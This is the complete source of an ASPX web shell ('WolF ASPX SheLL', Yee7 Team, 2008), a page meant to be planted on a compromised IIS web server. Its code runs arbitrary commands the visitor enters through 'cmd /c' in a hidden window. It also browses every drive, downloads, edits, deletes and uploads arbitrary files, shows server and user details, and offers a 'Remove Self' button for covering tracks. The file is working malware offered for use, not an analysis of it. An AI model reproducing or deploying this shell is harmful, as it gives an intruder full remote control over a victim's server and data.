<!--/********************************************************* 
** Description : Shell ASPX for All  Version Frame Work		** 
** File Name   : WolF.aspx								** 
** Version     : 1.0									** 
** Author      : ThE WhitE WolF							** 
** Website     : www.Yee7.com						** 
** Modified    :  12/2008   				     	** 
** Email	   : the_white_wolf_x@hotmail.com					** 
**********************************************************/ 
/************************************************************************
    ASPX Shell.
    Copyright (C) 2008  Yee7 Team

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 1 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
********************************************************************************/
!-->
<%@ Page language="c#" ValidateRequest="false"  %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace= "System.Drawing" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Web.SessionState" %>
<%@ Import Namespace="System.Web.UI" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Web.UI.HtmlControls" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Runtime.InteropServices"%>
<script  runat="server">
    [DllImport("kernel32.dll", EntryPoint = "GetDriveTypeA")]

    public static extern int GetDriveType(string nDrive);
    string[] drive;
    public static string folderToBrowse;
    public void GetData(string Folder)
    {
        DirectoryInfo DirInfo = new DirectoryInfo(Folder);
        //of folders in the specified directory
        DataTable fileSystemFolderTable = new DataTable();
        //create our datatable that would hold the list
        //of files in the specified directory
        DataTable fileSystemFileTable = new DataTable();
        //create our datatable that would hold the list
        //of files and folders when we combine the two previously declared datatable
        DataTable fileSystemCombinedTable = new DataTable();

        //create the columns for our file datatable
        DataColumn dcFileType = new DataColumn("Type");
        DataColumn dcFileFullName = new DataColumn("FullName");
        DataColumn dcFileName = new DataColumn("Name");
        DataColumn dcFileSize = new DataColumn("Size");
        DataColumn dcFileEdit = new DataColumn("Edit");
        DataColumn dcFileDownload = new DataColumn("Download");
        DataColumn dcFileDelete = new DataColumn("Delete");

        ///create the columns for our folder datatable
        DataColumn dcFolderType = new DataColumn("Type");
        DataColumn dcFolderFullName = new DataColumn("FullName");
        DataColumn dcFolderName = new DataColumn("Name");
        DataColumn dcFolderSize = new DataColumn("Size");
        DataColumn dcFolderEdit = new DataColumn("Edit");
        DataColumn dcFolderDownload = new DataColumn("Download");
        DataColumn dcFolderDelete = new DataColumn("Delete");

        //add the columns to our datatable
        fileSystemFolderTable.Columns.Add(dcFileType);
        fileSystemFolderTable.Columns.Add(dcFileName);
        fileSystemFolderTable.Columns.Add(dcFileFullName);
        fileSystemFolderTable.Columns.Add(dcFileSize);
        fileSystemFolderTable.Columns.Add(dcFileEdit);
        fileSystemFolderTable.Columns.Add(dcFileDownload);
        fileSystemFolderTable.Columns.Add(dcFileDelete);

        fileSystemFileTable.Columns.Add(dcFolderType);
        fileSystemFileTable.Columns.Add(dcFolderName);
        fileSystemFileTable.Columns.Add(dcFolderFullName);
        fileSystemFileTable.Columns.Add(dcFolderSize);
        fileSystemFileTable.Columns.Add(dcFolderEdit);
        fileSystemFileTable.Columns.Add(dcFolderDownload);
        fileSystemFileTable.Columns.Add(dcFolderDelete);

        //loop thru each directoryinfo object in the specified directory
        foreach (DirectoryInfo di in DirInfo.GetDirectories())
        {
            //create a new row in ould folder table
            DataRow fileSystemRow = fileSystemFolderTable.NewRow();

            //assign the values to our table members
            fileSystemRow["Type"] = "<font size=4 face=wingdings color=Gray >0</font>";
            fileSystemRow["Name"] = di.Name;
            fileSystemRow["FullName"] = di.FullName;
            fileSystemRow["Size"] = "..";
            fileSystemRow["Edit"] = "..";
            fileSystemRow["Download"] = "..";
            fileSystemRow["Delete"] = "..";
            fileSystemFolderTable.Rows.Add(fileSystemRow);
        }

        //loop thru each fileinfo object in the specified directory
        foreach (FileInfo fi in DirInfo.GetFiles())
        {
            //create a new row in ould folder table
            DataRow fileSystemRow = fileSystemFileTable.NewRow();

            //assign the values to our table members
            fileSystemRow["Type"] = "<font size=4 face=wingdings color=Gray >2</font>";
            fileSystemRow["Name"] = fi.Name;
            fileSystemRow["FullName"] = fi.FullName;
            fileSystemRow["Size"] = "[" + fi.Length + "]bytes";
            fileSystemRow["Edit"] = "<font size=4 align=center color=WhiteSmoke face=wingdings>?</font>";
            fileSystemRow["Download"] = "<font size=4 align=center algin=cenetre face=wingdings color=WhiteSmoke ><</font>";
            fileSystemRow["Delete"] = "<font color=WhiteSmoke  face=webdings size=4>r</font>";
            fileSystemFileTable.Rows.Add(fileSystemRow);
        }

        //copy the folder table to our main datatable,
        //this is necessary so that the parent table would have the
        //schema of our child tables.
        fileSystemCombinedTable = fileSystemFolderTable.Copy();

        //loop thru each row of our file table
        foreach (DataRow drw in fileSystemFileTable.Rows)
        {
            //import the rows from our child table to the parent table
            fileSystemCombinedTable.ImportRow(drw);
        }

        //assign our file system parent table to our grid and bind it.
        FileSystem.DataSource = fileSystemCombinedTable;
        FileSystem.DataBind();
    
    }
    
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            try
            {
                folderToBrowse = Request.QueryString["d"] == null ? Server.MapPath("./") : Request.QueryString["d"];

                //read the folder		
               
                // oprating system

                OperatingSystem os = Environment.OSVersion;
                  switch (os.Version.Major)
                  {
                      case 3:
                          system0.Text = Environment.OSVersion.ToString() + "(Windows NT 3.51)";
                          break;
                      case 4:
                          system0.Text = Environment.OSVersion.ToString() + "(Windows NT 4.0)";
                          break;
                      case 5:
                          if (os.Version.Minor == 0)
                              system0.Text = Environment.OSVersion.ToString() + " (Windows Server 2000)";
                          else if(os.Version.Minor==1)
                              system0.Text = Environment.OSVersion.ToString() + " (Windows XP)";
                          else
                              system0.Text = Environment.OSVersion.ToString() + " (Windows Server 2003)";
                              
                          break;
                  }
                    
                // log user name
                log0.Text = Environment.UserName.ToString();
                // Request IP 
                uIP0.Text = Request.ServerVariables["REMOTE_ADDR"].ToString();
                //create our datatable that would hold the list
                //Server Ip

                txtPath.Text = folderToBrowse;
                ServIP.Text = Request.ServerVariables["LOCAL_ADDR"].ToString();//ip[0].ToString();

                //path info 
                txtPath.Text = folderToBrowse;//Request.ServerVariables["PATH_TRANSLATED"];
                GetData(folderToBrowse);
                drive = Directory.GetLogicalDrives();
                Drivers.Items.Clear();
                for (int i = 0; i < drive.Length; i++)
                {

                    if (GetDriveType(drive[i]) == 3)
                    {
                        Drivers.Items.Add(drive[i]);
                    }
                }

            }
            catch (Exception ee) { lblInfox.Text= ee.Message ; }

        }
    }// end load
    public  static string filepath="";
   public static string type="";
    protected void FileSystem_ItemCommand(object source, DataGridCommandEventArgs e)
    {
        filepath = e.CommandArgument.ToString();

        string Folder = "<font size=4 face=wingdings color=Gray >0</font>";
            
        string fileSystemType = FileSystem.Items[e.Item.ItemIndex].Cells[0].Text;
        
       try
            {
       // lblInfo.Text = fileSystemType;
        if (fileSystemType == Folder)
        {
            //get the filepath from the specified command arguments for our linkbutton

            //get the file system type of the selected ite


            //if its a directory, redirect to our page and passing
            //the new file path to our query string
            Response.Redirect(Request.ServerVariables["SCRIPT_NAME"] + "?d=" + e.CommandArgument.ToString());
        }
        else //if (fileSystemType == Files )
        {
          switch(e.CommandName)
          {
              //case download file
              case "<font size=4 align=center algin=cenetre face=wingdings color=WhiteSmoke ><</font>":
              string filename = e.CommandName;

            //read the file to our stream
            Stream s = File.OpenRead(filepath);

            //create the bytes to be streamed
            Byte[] buffer = new Byte[s.Length];

            //build the buffer
            try
            {
                s.Read(buffer, 0, (Int32)s.Length);
            }
            //close our stream
            finally { s.Close(); }

            //clear the response headers
            Response.ClearHeaders();
            //clear the content type
            Response.ClearContent();
            Response.ContentType = "application/octet-stream";
            //add our header
            Response.AddHeader("Content-Disposition", "attachment; filename=" + filename);
            //write the buffer to the http stream
            Response.BinaryWrite(buffer);
            //end response
            Response.End();
                  break;
                  // case edit file
              case "<font size=4 align=center color=WhiteSmoke face=wingdings>?</font>":
                  FileSystem.Visible = false;
            txtDis.Visible = true;
            btnSave.Visible = true;
            StreamReader sr = new StreamReader(filepath);
            txtDis.Text = sr.ReadToEnd();
            break;
                  //delete file case 
              case "<font color=WhiteSmoke  face=webdings size=4>r</font>":
            FileInfo fDelete = new FileInfo(filepath);
            fDelete.Delete();
            lblInfox.Text = "File :"+Path.GetFileName(filepath)+" Deleted Successfly";
            GetData(txtPath.Text);
            //Response.Redirect(Request.ServerVariables["HTTP_REFERER"]);//+"="+ );
           
            break;
              default :
            txtDis.ReadOnly = true;
            txtDis.Visible = true;
                           
            StreamReader sr1 = new StreamReader(filepath);
            txtDis.Text = sr1.ReadToEnd();

            break;
        }
                       
        }
       
            }

            catch (Exception ee) { lblInfox.Text= ee.Message; }
        }
    
 //end click grid


    protected void ADD_Click(object sender, EventArgs e)
    {
        System.Diagnostics.ProcessStartInfo sinf = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + this.txt.Text + "");
        // The following commands are needed to redirect the standard output. This means that it will be redirected to the Process.StandardOutput StreamReader.
        sinf.RedirectStandardOutput = true;
        sinf.UseShellExecute = false;
        // Do not create that ugly black window, please...
        sinf.CreateNoWindow = true;
        // Now we create a process, assign its ProcessStartInfo and start it
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo = sinf;
        p.Start(); // well, we should check the return value here...
        // We can now capture the output into a string...

        string res = p.StandardOutput.ReadToEnd();
        this.txtDis.Text = Server.HtmlEncode(res);
        this.txtDis.DataBind();
    }


    protected void btnUpload_Click(object sender, EventArgs e)
    {
        lblInfox.Text = "";
    /*  if ((File1.PostedFile != null) && (File1.PostedFile.ContentLength > 0))
        {
            string fn = System.IO.Path.GetFileName(File1.PostedFile.FileName);
            string SaveLocation = Server.MapPath("Data") + "\\" + fn;
            try
            {
                File1.PostedFile.SaveAs(SaveLocation);
                lblInfo.Text="The file has been uploaded.";
            }
            catch (Exception ex)
            {
                lblInfo.Text= "Error: " + ex.Message;
                //Note: Exception.Message returns a detailed message that describes the current exception. 
                //For security reasons, we do not recommend that you return Exception.Message to end users in 
                //production environments. It would be better to return a generic error message. 
            }
        }
        else
        {
          lblInfo.Text= "Please select a file to upload.";
        }*/
        DirectoryInfo Dir = new DirectoryInfo(txtPath.Text);
        
        if (File1.PostedFile.FileName == "")
        { 
        lblInfox.Text="No File specified";
        }else
        {
            string filename = Path.GetFileName(File1.PostedFile.FileName);
            string fullpath = Path.Combine(Dir.FullName, filename);
            try
            {

                File1.PostedFile.SaveAs(fullpath);
                
             //   Response.Redirect(Request.ServerVariables["HTTP_REFERER"]);
                lblInfox.Text = "File :" + filename + " Uploaded Successfly";
                GetData(folderToBrowse);
            
            }
            catch (Exception ex) { lblInfox.Text = ex.Message; }
        
        
        }
    }

  




    protected void btnSave_Click(object sender, EventArgs e)
    {
        try
        {
            lblInfox.Text = "";
            StreamWriter sw = new StreamWriter(filepath);
            sw.Write(txtDis.Text);
            sw.Close();
            lblInfox.Text = "File Saved Successfly";
            
        }
        catch (Exception ex) { lblInfox.Text = ex.Message; }

    }



    protected void Drivers_SelectedIndexChanged(object sender, EventArgs e)
    {
      //  
    }

    protected void btnView_Click(object sender, EventArgs e)
    {

        lblInfox.Text = "";
        Response.Redirect(Request.ServerVariables["SCRIPT_NAME"] + "?d=" + this.txtPath.Text);
        
    }

    protected void lnkExec_Click(object sender, EventArgs e)
    {
        lblInfox.Text = "";
        txtDis.Text = "";
        txtDis.Visible = true;
        Button1.Visible = true;
        txt.Visible = true;
        lblCommand.Visible = true;
        FileSystem.Visible = true;
        btnSave.Visible = false;
        btnUpload.Visible = false;
        File1.Visible = false;
        lblUpload.Visible = false;
    }

    protected void lnkHome_Click(object sender, EventArgs e)
    {
        lblInfox.Text = "";
Response.Redirect("http://"+Request.ServerVariables["SERVER_NAME"]+Request.ServerVariables["SCRIPT_NAME"]);
    }

    protected void lnkUpload_Click(object sender, EventArgs e)
    {
        lblInfox.Text = "";
        txtDis.Visible = false;
        Button1.Visible = false;
        txt.Visible = false;
        lblCommand.Visible = false;
       
        
        btnUpload.Visible = true;
        File1.Visible = true;
        lblUpload.Visible = true;
        FileSystem.Visible = true;
    }

    protected void lnkRef_Click(object sender, EventArgs e)
    {
        lblInfox.Text = "";
        GetData(txtPath.Text);
    }

    protected void btnGo_Click(object sender, EventArgs e)
    {
        Response.Redirect(Request.ServerVariables["SCRIPT_NAME"] + "?d=" + this.Drivers.SelectedValue);
    }

    protected void lnkDel_Click(object sender, EventArgs e)
    {
        FileInfo fDelete = new FileInfo(Server.MapPath(Request.ServerVariables["SCRIPT_NAME"]));
        fDelete.Delete();
        lblInfox.Text = "File :" + Path.GetFileName(filepath) + " Deleted Successfly";
    }
</script>

<HTML>
	<HEAD>
		<title>--------[WolF ASPX SheLL & YEE7 TeaM]------</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="C#" name="CODE_LANGUAGE">
		<meta content="JavaScript" name="vs_defaultClientScript">
		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
	    <style type="text/css">
            #Form1
            {
                height: 929px;
                direction: ltr;
                width: 792px;
                margin-right: 0px;
            }
            .style1
            {
                width: 117%;
                height: 728px;
            }
            #Submit1
            {
                height: 21px;
                width: 77px;
            }
            *		{scrollbar-base-color:#777777;
scrollbar-track-color:#777777;scrollbar-darkshadow-color:#777777;scrollbar-face-color:#505050;
scrollbar-arrow-color:#ff8300;scrollbar-shadow-color:#303030;scrollbar-highlight-color:#303030;}
*		{scrollbar-base-color:#777777;
scrollbar-track-color:#777777;scrollbar-darkshadow-color:#777777;scrollbar-face-color:#505050;
scrollbar-arrow-color:#ff8300;scrollbar-shadow-color:#303030;scrollbar-highlight-color:#303030;}
*		{scrollbar-base-color:#777777;
scrollbar-track-color:#777777;scrollbar-darkshadow-color:#777777;scrollbar-face-color:#505050;
scrollbar-arrow-color:#ff8300;scrollbar-shadow-color:#303030;scrollbar-highlight-color:#303030;
                margin-left: 0px;
                margin-top: 6px;
            }
            .style11
            {
                text-align: center;
                height: 423px;
            }
            .style13
            {
                height: 125px;
                text-align: center;
            }
            .style14
            {
                height: 119px;
                text-align: center;
            }
            .style15
            {
                width: 74%;
                border: 1px solid #75787C;
            }
            .style16
            {
                height: 43px;
                width: 687px;
            }
            .style17
            {
                text-align: center;
                height: 26px;
            }
            .style20
            {
                text-align: center;
            }
            .style22
            {
                height: 20px;
                text-align: center;
            }
            .style23
            {
                height: 36px;
                text-align: center;
            }
            .style24
            {
                height: 426px;
            }
            </style>
	

</script>
</HEAD>
	<body bgcolor="Black">
		<form id="Form1" method="post" enctype="multipart/form-data" runat="server"  >
			
         
			
        <br />
			
         
			
        <table class="style1">
                <tr>
                    <td style="color: #00FF00; direction: ltr;" class="style13">
        <table class="style15">
            <tr>
                <td bgcolor="#666666" align="center">
                    -----------<font color="Black"  face="webdings" size="6" >N</font>--------------[WolF 
                    ASPX SheLL / Yee7 Team]-----------<font color="Black"  face="webdings" size="6" >N</font>------------</td>
            </tr>
            <tr>
                <td bgcolor="#303030">
                        <asp:Label ID="system" runat="server" Text="System :" ForeColor="#FF8300" BorderColor="White"></asp:Label>
                        &nbsp; <asp:Label ID="system0" runat="server" ForeColor="White"></asp:Label>
                        </td>
            </tr>
            <tr>
                <td bgcolor="#303030">
                        <asp:Label ID="log" runat="server" Text="User Log :" ForeColor="#FF8300"></asp:Label>
            &nbsp; <asp:Label ID="log0" runat="server" ForeColor="White"></asp:Label>
                    </td>
            </tr>
            <tr>
                <td bgcolor="#303030">
                        <asp:Label ID="uIP1" runat="server" Text="Server IP :" ForeColor="#FF8300"></asp:Label>
                        &nbsp;
                        <asp:Label ID="ServIP" runat="server" ForeColor="White"></asp:Label>
                        </td>
            </tr>
            <tr>
                <td bgcolor="#303030">
                        <asp:Label ID="uIP" runat="server" Text="Your IP :" ForeColor="#FF8300"></asp:Label>
                        &nbsp;&nbsp;&nbsp; <asp:Label ID="uIP0" runat="server" ForeColor="White"></asp:Label>
                    </td>
            </tr>
            <tr>
                <td bgcolor="#666666">
                    &nbsp;</td>
            </tr>
        </table>
                    </td>
                </tr>
                <tr>
                    <td style="color: #00FF00; direction: ltr;" class="style14">
			
         
			
<Table class="style15" ><tr><td bgcolor=#505050 >
<font face=Arial size=2 color=#ff8300 > PATH INFO : </font></td></tr>
<tr><td cellpadding=2 bgcolor=#303030 ><font face=Arial size=-1 color=gray>Virtual: http://<%=Request.ServerVariables["SERVER_NAME"]%><%=Request.ServerVariables["SCRIPT_NAME"]%></Font><BR><font face=wingdings color=Gray >1<br />
    </font>
&nbsp;<font face=Arial size=+1 color=White ><%=folderToBrowse%></font><BR>&nbsp;<asp:TextBox 
        ID="txtPath" runat="server" BorderStyle="None" Width="542px"></asp:TextBox>
&nbsp;&nbsp;&nbsp;&nbsp;<font face="Arial" size="2" color="#ff8300" ><asp:Button ID="btnView" 
        runat="server" BorderStyle="None" Height="24px" 
                            Text="view" Width="69px" onclick="btnView_Click" />
                        </font>
                        &nbsp;&nbsp;&nbsp;&nbsp;</td></tr></table>
                    </td>
                </tr>
                <tr>
                    <td style="color: #00FF00; direction: ltr;" class="style23">
                        <table class="style15">
                            <tr>
                                <td bgcolor="#666666" class="style22" align="center">
                                    &nbsp;<span class="style5"><asp:Label ID="lblUpload0" runat="server"  
                            Text="Drivers :  " ForeColor="#FF8300" Font-Size="Medium"></asp:Label>
                                    </span>
                                    <asp:DropDownList ID="Drivers" runat="server" BackColor="#666666" 
                                        ForeColor="White" Height="16px" Width="130px">
                                    </asp:DropDownList>
&nbsp;
<asp:Button Text="[Go]" OnClick="btnGo_Click" Runat="server" ID="btnGo" BackColor="#666666" 
                            BorderColor="White" BorderStyle="Groove" ForeColor="White" 
                                        Height="21px" Width="83px"></asp:Button>
                                </td>
                            </tr>
                        </table>
                    </td>
                </tr>
                <tr>
                    <td style="color: #00FF00; direction: ltr;" class="style20">
                        <table class="style15">
                            <tr>
                                <td bgcolor="#666666">
                                    <asp:LinkButton ID="lnkHome" runat="server" onclick="lnkHome_Click">[Home]</asp:LinkButton>
                                    &nbsp;&nbsp;&nbsp;<asp:LinkButton ID="lnkRef" runat="server" onclick="lnkRef_Click">[Refresh]</asp:LinkButton>
                                    &nbsp;&nbsp;
                                    <asp:LinkButton ID="lnkExec" runat="server" onclick="lnkExec_Click">[Execute 
                                    Command]</asp:LinkButton>
                                    &nbsp;&nbsp;
                                    <asp:LinkButton ID="lnkUpload" runat="server" onclick="lnkUpload_Click">[Upload]</asp:LinkButton>
                                    &nbsp;&nbsp;
                                    <asp:LinkButton ID="lnkDel" runat="server" onclick="lnkDel_Click">[Remove Self]</asp:LinkButton>
                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
                            </tr>
                        </table>
                    </td>
                </tr>
                <tr>
                    <td class="style11">
                        <table class="style15">
                            <tr>
                                <td bgcolor="#303030" class="style24">
                                    &nbsp;<font color="#00FF00" style="text-align: center"><asp:Label ID="lblCommand" runat="server"  
                            Text="Command :" ForeColor="#FF8300" Visible="False"></asp:Label>
                        &nbsp;<asp:TextBox ID="txt" Runat="server" Width="281px" Visible="False"></asp:TextBox>
                        </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<asp:Button Text="Execute" OnClick="ADD_Click" Runat="server" ID="Button1" BackColor="#666666" 
                            BorderColor="White" BorderStyle="Groove" ForeColor="White" Visible="False"></asp:Button>
                                    <span class="style5">
                        <asp:Label ID="lblUpload" runat="server"  
                            Text="File Upload :" ForeColor="#FF8300" Visible="False"></asp:Label>
                                    &nbsp;</span>&nbsp;&nbsp;&nbsp;&nbsp;
                      
                    <input type="file" id="File1" name="File1" runat="server" visible="False" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button ID="btnUpload" type="submit" runat="server" Height="24px" 
                            onclick="btnUpload_Click" Text="Upload" Width="79px" Visible="False" />

                                    <br />

                                    <asp:Label ID="lblInfox" runat="server" Font-Size="Medium" ForeColor="#FF8300"></asp:Label>
                                    <asp:Button ID="btnSave" runat="server" BackColor="#505050" BorderColor="White" 
                            BorderStyle="Ridge" ForeColor="White" onclick="btnSave_Click" Text="[Save]" 
                            Width="674px" Visible="False" />
                                    <br />
                        <asp:TextBox ID="txtDis" runat="server" BackColor="#666666" ForeColor="White" 
                            Height="217px" TextMode="MultiLine" Visible="False" Width="675px" ></asp:TextBox>
                        <asp:datagrid id="FileSystem" runat="server" AllowSorting="True" 
                Font-Names="Arial" Font-Size="XX-Small"
				AutoGenerateColumns="False" onitemcommand="FileSystem_ItemCommand" 
                ForeColor="White" Font-Bold="False" Font-Italic="False" Font-Overline="False" 
                            Font-Strikeout="False" Font-Underline="False" Height="111px" Width="674px">
				            <PagerStyle Font-Bold="False" Font-Italic="False" Font-Overline="False" 
                                Font-Strikeout="False" Font-Underline="False" ForeColor="White" />
				<Columns>
					<asp:BoundColumn DataField="Type" HeaderText=" [Type] " 
                        HeaderStyle-Font-Size="10" HeaderStyle-ForeColor="White" 
                        HeaderStyle-BackColor="#505050">
                     <HeaderStyle Width="80px"></HeaderStyle>
					</asp:BoundColumn>
					<asp:TemplateColumn HeaderText=" [Name] " HeaderStyle-Font-Size="10" 
                        HeaderStyle-ForeColor="White">
						<HeaderStyle Width="350px"></HeaderStyle>
						<ItemTemplate>
							<asp:LinkButton id="systemLink" ForeColor="WhiteSmoke" runat="server" CommandArgument='<%# DataBinder.Eval(Container, "DataItem.FullName") %>' CommandName='<%# DataBinder.Eval(Container, "DataItem.Name") %>'>
								<%# DataBinder.Eval(Container, "DataItem.Name") %>
							</asp:LinkButton>
						</ItemTemplate>
					</asp:TemplateColumn>
				    <asp:BoundColumn DataField="Size" HeaderText="[Size]"></asp:BoundColumn>
				    <asp:TemplateColumn HeaderText=" [Edit] " HeaderStyle-Font-Size="10">
				    <ItemTemplate>
                            <asp:LinkButton ID="systemEdit" runat="server" 
                                CommandArgument='<%# DataBinder.Eval(Container, "DataItem.FullName") %>' 
                                CommandName='<%# DataBinder.Eval(Container, "DataItem.Edit") %>' 
                                ForeColor="WhiteSmoke">
                            <!--	<%# type = "<font size=4 face=wingdings color=Gray >4</font>"%> !-->
                            <%# DataBinder.Eval(Container,"DataItem.Edit") %>
                            </asp:LinkButton>
                        </ItemTemplate>

<HeaderStyle Font-Size="10pt"></HeaderStyle>
				        <ItemStyle Font-Bold="False" Font-Italic="False" Font-Overline="False" 
                            Font-Strikeout="False" Font-Underline="False" HorizontalAlign="Center" />
				    </asp:TemplateColumn>
				    <asp:TemplateColumn HeaderText=" [Download] " HeaderStyle-Font-Size="10">
				    <ItemTemplate>
                            <asp:LinkButton ID="systemDownload" runat="server" 
                                CommandArgument='<%# DataBinder.Eval(Container, "DataItem.FullName") %>' 
                                CommandName='<%# DataBinder.Eval(Container, "DataItem.Download") %>' 
                                ForeColor="WhiteSmoke">
                          <%# DataBinder.Eval(Container, "DataItem.Download") %>
                                                      </asp:LinkButton>
                        </ItemTemplate>

<HeaderStyle Font-Size="10pt"></HeaderStyle>
				        <ItemStyle Font-Bold="False" Font-Italic="False" Font-Overline="False" 
                            Font-Strikeout="False" Font-Underline="False" HorizontalAlign="Center" />
				    </asp:TemplateColumn>
                    <asp:TemplateColumn HeaderText="[Delete]" HeaderStyle-Font-Size="10">
                        <ItemTemplate>
                            <asp:LinkButton ID="systemDelete" runat="server" 
                                CommandArgument='<%# DataBinder.Eval(Container, "DataItem.FullName") %>' 
                                CommandName='<%# DataBinder.Eval(Container, "DataItem.Delete") %>' 
                                ForeColor="WhiteSmoke">
                   <%# DataBinder.Eval(Container, "DataItem.Delete") %>
                  
                            </asp:LinkButton>
                        </ItemTemplate>

<HeaderStyle Font-Size="10pt"></HeaderStyle>
                        <ItemStyle Font-Bold="False" Font-Italic="False" Font-Overline="False" 
                            Font-Strikeout="False" Font-Underline="False" HorizontalAlign="Center" />
                    </asp:TemplateColumn>
				</Columns>
			                <HeaderStyle BackColor="#505050" Font-Bold="False" Font-Italic="False" 
                                Font-Overline="False" Font-Strikeout="False" Font-Underline="False" 
                                ForeColor="White" />
			</asp:datagrid>
                                    </font></td>
                            </tr>
                        </table>
                    </td>
                </tr>
                
                <tr>
                    <td class="style17">
                        <table class="style15">
                            <tr>
                                <td bgcolor="#666666" class="style16" align="center">
                                    <a href="mailto: ]-----------%20ThE%20WhitE%20WolF%20(the_white_wolf_x@hotmail.com">
                                    ]----------- ThE WhitE WolF (the_white_lf_x@hotmail.com -------------------[</a>
                                    <br />
&nbsp;]-------------------------[Copyright 2008 @ <a href="http://www.Yee7.com">Yee7 Team  </a>]-------------------------[ </td>
                            </tr>
                        </table>
                    </td>
                </tr>
               
                
            </table>


        </form>
	</body>
</HTML>

